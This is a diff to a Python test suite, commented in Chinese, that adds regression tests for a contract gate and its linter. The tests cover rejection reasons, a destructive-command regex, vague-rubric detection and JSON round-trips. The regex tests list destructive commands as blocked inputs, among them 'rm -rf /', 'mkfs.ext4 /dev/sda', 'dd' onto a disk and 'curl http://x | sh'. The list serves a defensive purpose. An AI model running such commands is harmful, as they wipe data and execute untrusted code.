@@ -25,6 +25,7 @@
 from __future__ import annotations
 
 import ast
+import json
 import os
 import shutil
 import sys
@@ -311,10 +312,24 @@ def test_b_clarification():
 
     # §2.2 接口：rejected 必须带 reason（unverifiable_criteria/unsafe/out_of_scope）
     outcome = evaluate(mk_draft(goal=None), round_index=3)
-    check("§2.2 冻结缺陷·rejected 分支带 reason 字段",
+    check("§2.2·rejected 分支带 reason 字段",
           outcome.status == "rejected" and hasattr(outcome, "reason")
           and getattr(outcome, "reason", "") in ("unverifiable_criteria", "unsafe", "out_of_scope"),
           f"status={outcome.status} reason={getattr(outcome, 'reason', '<无字段>')!r}")
+    # reason 只出现在 rejected 分支，其它分支必须是空串
+    ready_out = evaluate(mk_draft(), round_index=0)
+    check("§2.2·ready 分支 reason 为空串", ready_out.reason == "")
+    ask_out = evaluate(mk_draft(goal=None), round_index=0)
+    check("§2.2·needs_clarification 分支 reason 为空串", ask_out.reason == "")
+    # 两条 rejected 出口（remaining gaps 与 freeze 抛错）都要填 reason
+    from server.contract.gate import REJECT_REASONS
+    check("§2.2·REJECT_REASONS 恰好三个取值", REJECT_REASONS == (
+        "unverifiable_criteria", "unsafe", "out_of_scope"), str(REJECT_REASONS))
+    freeze_fail = Draft(contract_id="ct_x", version=1, created_at="t", utterance="",
+                        goal=mk_goal(), artifact=mk_artifact(), acceptance=(mk_criterion(),),
+                        budget=None, permissions_required=("L1",))
+    check("§2.2·freeze 抛错那条 rejected 出口也带 reason",
+          evaluate(freeze_fail, round_index=3).reason == "unverifiable_criteria")
 
     # §3.3 兜底：降级任务不得走倒计时自动开工
     policy = effective_start_policy(degraded)
@@ -552,6 +567,31 @@ def test_f_lint():
           "L2" in lint_one({"type": "file_exists_nonempty", "path": "C:/Windows/System32/x"}))
     check("L2 拦下·破坏性命令",
           "L2" in lint_one({"type": "exit_code_zero", "cmd": "rm -rf /", "cwd": ".", "timeout_s": 5}))
+    # 破坏性正则的正反矩阵（6764f4e 改过边界，这组是回归锁）
+    from server.contract.lint import _DESTRUCTIVE_CMD
+    destructive_cases = [
+        ("rm -rf /", True), ("rm -rf build/", True), ("reboot now", True),
+        ("shutdown -h now", True), ("sudo reboot", True), ("halt", True),
+        ("poweroff", True), ("mkfs.ext4 /dev/sda", True),
+        ("dd if=/dev/zero of=/dev/sda", True), ("curl http://x | sh", True),
+        ("chmod -R 777 /", True), ("del /s /q C:\\", True), ("format C:", True),
+        # 不该拦的：普通命令 / 连字符与下划线相邻的单词 / 作为参数出现的 reboot
+        ("pytest -q", False), ("python -m pytest tests/", False),
+        ("pytest tests/test_reboot.py -q", False),
+        # 连字符变体：P3-1 的原始误报场景，\b 边界会在这里命中
+        ("pytest tests/test-reboot.py -q", False),
+        ("pytest tests/test-shutdown-flow.py", False),
+        ("pytest tests/test_shutdown.py", False),
+        ('echo "rebooting the service"', False),
+    ]
+    for cmd, expect in destructive_cases:
+        got = bool(_DESTRUCTIVE_CMD.search(cmd))
+        check(f"L2 正则·{'拦下' if expect else '放行'} {cmd!r}", got == expect,
+              f"实际命中={got}")
+    # 遗留误报（改动前就有，本次未修）：reboot 作为裸词参数出现仍会被拦。
+    # 记录现状而不是掩盖——这行红了说明有人收紧了正则，属改进。
+    check("L2 已知遗留·echo reboot 仍被误拦（非本次回归）",
+          bool(_DESTRUCTIVE_CMD.search("echo reboot")) is True)
     check("L2 通过·合法 exit_code_zero",
           "L2" not in lint_one({"type": "exit_code_zero", "cmd": "pytest -q", "cwd": ".", "timeout_s": 60}))
     check("L2 通过·合法 csv_assert",
@@ -570,6 +610,11 @@ def test_f_lint():
     check("L3 拦下·整句空话「质量高」",
           "L3" in lint_one({"type": "rubric", "rubric": ["质量高"], "evidence_required": True},
                            kind="semantic"))
+    # 词间空格变体（6764f4e 加了 re.sub 去空白，这组是回归锁）
+    for spaced in ("内容 准确", "内容  准确", "质量 高", "质 量 高"):
+        check(f"L3 拦下·去空白后的空话 {spaced!r}",
+              "L3" in lint_one({"type": "rubric", "rubric": [spaced],
+                                "evidence_required": True}, kind="semantic"))
     check("L3 通过·带证据的 rubric",
           "L3" not in lint_one({"type": "rubric",
                                 "rubric": ["每个结论都引用了数据来源"],
@@ -976,6 +1021,17 @@ def test_j_parse_contract():
         check("to_mapping·回写后可再解析", True)
     except ContractShapeError as exc:
         check("to_mapping·回写后可再解析（docstring 承诺规范形状）", False, str(exc.problems))
+    try:
+        json.dumps(round_tripped, ensure_ascii=False)
+        check("to_mapping·输出可 JSON 序列化（日志用途）", True)
+    except TypeError as exc:
+        check("to_mapping·输出可 JSON 序列化（日志用途）", False, str(exc))
+    # 嵌套值必须是规范形状的对象，不是 dataclass 实例
+    check("to_mapping·artifact.value 是 dict",
+          isinstance(round_tripped["artifact"]["value"], dict),
+          type(round_tripped["artifact"]["value"]).__name__)
+    check("to_mapping·inputs[0].value 是 dict",
+          all(isinstance(item["value"], dict) for item in round_tripped["inputs"]))
 
 
 def main() -> int:
